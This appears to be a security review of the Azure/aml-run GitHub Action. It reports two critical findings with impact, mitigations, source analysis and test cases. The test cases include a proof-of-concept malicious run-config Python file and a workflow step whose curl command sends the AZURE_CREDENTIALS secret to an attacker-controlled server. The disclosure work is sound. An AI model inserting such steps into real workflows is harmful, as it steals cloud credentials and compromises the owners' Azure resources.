## Combined Vulnerability List

This document outlines critical vulnerabilities identified in the Azure ML Run GitHub Action. These vulnerabilities could allow an attacker with repository write access to compromise the Azure Machine Learning environment.

### 1. Arbitrary Code Execution via Run Config Python File

- **Vulnerability Name:** Arbitrary Code Execution via Run Config Python File
- **Description:**
    - An attacker compromises the GitHub repository.
    - The attacker modifies the GitHub workflow file (e.g., `.github/workflows/main.yml`) to change the value of the `runconfig_python_file` input for the `Azure/aml-run` action. This input specifies the Python file that defines the Azure ML run configuration.
    - The attacker creates a malicious Python file and sets the `runconfig_python_file` input to point to this file. This malicious file can contain arbitrary Python code.
    - When the GitHub workflow runs, the `Azure/aml-run` action executes.
    - The action loads the malicious Python file specified by the attacker-controlled `runconfig_python_file` input using `importlib.util.spec_from_file_location` and `importlib.util.module_from_spec`.
    - The action then executes a function (default `main`) within the malicious Python file using `getattr` and function call.
    - The malicious Python code is executed within the Azure Machine Learning environment, potentially granting the attacker unauthorized access to data, resources, or the ability to perform other malicious actions within the Azure ML workspace.
- **Impact:**
    - Full control over the Azure Machine Learning environment.
    - Data exfiltration or manipulation.
    - Resource compromise within Azure ML.
    - Lateral movement within the Azure environment if credentials are mismanaged.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:** None
- **Missing Mitigations:**
    - Input validation for `runconfig_python_file` to restrict the path to a predefined set of allowed files or locations.
    - Code review and static analysis to detect potentially malicious code in the run config Python file (though this is difficult in general).
    - Principle of least privilege for the service principal used by the GitHub Action to limit the impact of a successful exploit.
- **Preconditions:**
    - Attacker has write access to the GitHub repository (e.g., compromised repository maintainer account or successful pull request merge of malicious changes).
- **Source Code Analysis:**
    - In `/code/main.py`:
        - Lines 118-134: This section of the code is responsible for loading the run configuration.
        - Lines 129-134: If no run configuration is loaded from YAML files, the code proceeds to load it from a Python file using the `load_runconfig_python` function. The path to this Python file is determined by the `runconfig_python_file` parameter, which is directly taken from user input (`parameters.get("runconfig_python_file", "code/train/run_config.py")`).
    - In `/code/utils.py`:
        - Lines 131-171: The `load_runconfig_python` function is defined here.
        - Lines 140-148: The function uses `importlib.util.spec_from_file_location` to load the Python file specified by the `runconfig_python_file` parameter.
        - Line 149: `run_config_spec.loader.exec_module(run_config_module)` executes the loaded Python module.
        - Line 150: `run_config_function = getattr(run_config_module, runconfig_python_function_name, None)` retrieves the specified function name (default "main") from the loaded module.
        - Line 162: `run_config = run_config_function(workspace)` finally executes the function, passing the Azure ML workspace object as an argument.
        - **Vulnerability:** There is no validation or sanitization of the `runconfig_python_file` input before it is used in `importlib.util.spec_from_file_location`. This allows an attacker to specify any Python file path within the repository, leading to arbitrary code execution when the action runs.
- **Security Test Case:**
    1. Fork the repository to your own GitHub account.
    2. Navigate to the workflow files (e.g., `.github/workflows/integration_test.yml`) in your forked repository. Edit the workflow file.
    3. In the workflow file, locate the `Azure/aml-run` action step. Modify the `with` section of this step to include or modify the `runconfig_python_file` input to point to a malicious Python file. For example:
        ```yaml
        - uses: Azure/aml-run@v1
          id: aml_run
          with:
            azure_credentials: ${{ secrets.AZURE_CREDENTIALS }}
            runconfig_python_file: malicious_run_config.py # Point to malicious file
        ```
    4. In the root of your forked repository, create a new Python file named `malicious_run_config.py` with the following malicious code. This code is a proof of concept and can be replaced with more harmful actions:
        ```python
        import os
        from azureml.core import Workspace

        def main(workspace: Workspace):
            print("Malicious code execution started")
            try:
                # Example malicious action: List compute targets (can be replaced with data exfiltration, etc.)
                compute_targets = Workspace.get(
                    name=workspace.name,
                    subscription_id=workspace.subscription_id,
                    resource_group=workspace.resource_group
                ).compute_targets
                print("Compute targets:", list(compute_targets.keys()))
            except Exception as e:
                print(f"Error accessing compute targets: {e}")
            print("Malicious code execution finished")

            # Return a dummy valid run config to prevent action failure
            from azureml.core import ScriptRunConfig, Environment, ComputeTarget
            compute_target = ComputeTarget(workspace=workspace, name="aml-intTest") # Replace with existing compute target if needed
            environment = Environment(name="dummy-env") # Dummy environment
            script_config = ScriptRunConfig(source_directory=".", script="dummy_script.py", compute_target=compute_target, environment=environment)
            return script_config
        ```
    5. Also, create a dummy script file named `dummy_script.py` in the repository root. This file can be empty, as it's only needed to satisfy the `ScriptRunConfig` object returned by the malicious script.
    6. Commit and push both `malicious_run_config.py` and the modified workflow file to your forked repository.
    7. Observe the GitHub Actions run for your fork. Check the logs for the `Azure/aml-run` action step.
    8. If the vulnerability is successfully exploited, you will see the output "Malicious code execution started", followed by the attempt to list compute targets (or any other malicious actions you included in `malicious_run_config.py`), and finally "Malicious code execution finished" in the action logs. This demonstrates that arbitrary Python code provided by the attacker was executed within the Azure ML environment.

### 2. Secret Exfiltration through Workflow Modification

- **Vulnerability Name:** Secret Exfiltration through Workflow Modification
- **Description:**
  - An attacker with write access to the GitHub repository can modify the workflow YAML file to exfiltrate the `AZURE_CREDENTIALS` secret.
  - This can be achieved by adding a malicious step within the workflow definition, before or after the legitimate action steps.
  - This malicious step can access the `secrets.AZURE_CREDENTIALS` environment variable and exfiltrate it.
  - For example, the attacker could add a step that logs the secret to the workflow output, or sends it to an external service under their control.
  - This allows the attacker to bypass the intended security of storing secrets in GitHub Actions, as workflow modifications are not directly monitored for malicious secret access.
- **Impact:**
  - Successful exfiltration of the `AZURE_CREDENTIALS` secret grants the attacker unauthorized access to the victim's Azure Machine Learning workspace.
  - This access allows the attacker to perform various malicious activities, including:
    - Accessing and stealing sensitive data stored in the workspace.
    - Modifying or deleting machine learning models and experiments.
    - Deploying malicious models.
    - Launching compute resources, potentially incurring significant costs on the victim's Azure subscription.
    - Pivoting to other Azure services accessible with the compromised credentials, depending on the permissions granted to the service principal.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:** None. The project itself does not implement any mitigations against workflow modification or secret exfiltration. The security relies solely on GitHub's secret management and repository access controls, which are bypassed by this vulnerability when write access is compromised.
- **Missing Mitigations:**
    - Principle of Least Privilege for Service Principal: The documentation should strongly recommend users to create service principals with the minimum necessary permissions required for the action to function.
    - Workflow Protection Mechanisms: Implement branch protection rules to restrict who can modify the workflow files in the main branch and require code reviews for workflow changes.
    - Strong Security Warnings in Documentation: The documentation should explicitly warn users about the risks of storing highly sensitive credentials like `AZURE_CREDENTIALS` in GitHub Secrets and the potential for secret exfiltration.
- **Preconditions:**
    - The attacker must have write access to the GitHub repository where the workflow using this action is defined.
    - The repository must be configured to use the `Azure/aml-run` action and store the `AZURE_CREDENTIALS` secret in GitHub Secrets.
- **Source Code Analysis:**
    - **`action.yml`**: Defines the action's inputs, including `azure_credentials`, which is a required input intended to be passed as a GitHub secret (`${{ secrets.AZURE_CREDENTIALS }}`).
    - **`Dockerfile`, `entrypoint.sh`, `main.py`**: These files constitute the action's execution logic. `main.py` retrieves the `azure_credentials` from environment variables (`os.environ.get("INPUT_AZURE_CREDENTIALS")`) and uses it to authenticate with Azure.
    - **Vulnerability Location**: The vulnerability is not within the action's code itself but in the potential for malicious workflow modification to access and exfiltrate secrets before the action executes.
    - **Attack Vector Visualization:**
      ```
      Attacker Write Access --> Modify GitHub Workflow YAML (.github/workflows/...)
                                  |
                                  V
      Malicious Workflow Step Added (e.g., Exfiltrate Secret) --> Access ${{ secrets.AZURE_CREDENTIALS }}
                                  |
                                  V
      Secret Exfiltration (e.g., Send to Attacker Server, Log to Output)
                                  |
                                  V
      Unauthorized Access to Azure Machine Learning Workspace
      ```
- **Security Test Case:**
    1. **Prerequisites:**
        - You need a GitHub repository where you have write access and the `AZURE_CREDENTIALS` secret configured.
        - Have a simple HTTP server running or a service like webhook.site to capture exfiltrated data.
    2. **Modify Workflow:**
        - Edit the workflow YAML file that uses the `Azure/aml-run` action.
        - Insert a new step *before* the step that uses `Azure/aml-run@v1` to exfiltrate the `AZURE_CREDENTIALS` secret using `curl` to send it to an attacker-controlled server.
          ```yaml
          - name: Malicious Secret Exfiltration
            run: |
              SECRET_VALUE="${{ secrets.AZURE_CREDENTIALS }}"
              curl -X POST -H "Content-Type: application/json" -d '{"secret":"'$SECRET_VALUE'"}' https://attacker-controlled-server.com/exfiltrate
          ```
          **Important Security Note:** Replace `https://attacker-controlled-server.com/exfiltrate` with the URL of your actual test server or webhook capture service.
    3. **Commit and Push Changes:** Commit the modified workflow file and push the changes to your repository.
    4. **Trigger Workflow Run:** Trigger the workflow run.
    5. **Examine Workflow Logs:** Inspect the logs for the "Malicious Secret Exfiltration" step to confirm the script executed.
    6. **Verify Secret Capture (Attacker Server):** Check your attacker-controlled server or webhook capture service logs to find a request containing the `AZURE_CREDENTIALS` JSON.
    7. **Cleanup:** Immediately remove the malicious step and rotate the `AZURE_CREDENTIALS` secret in Azure.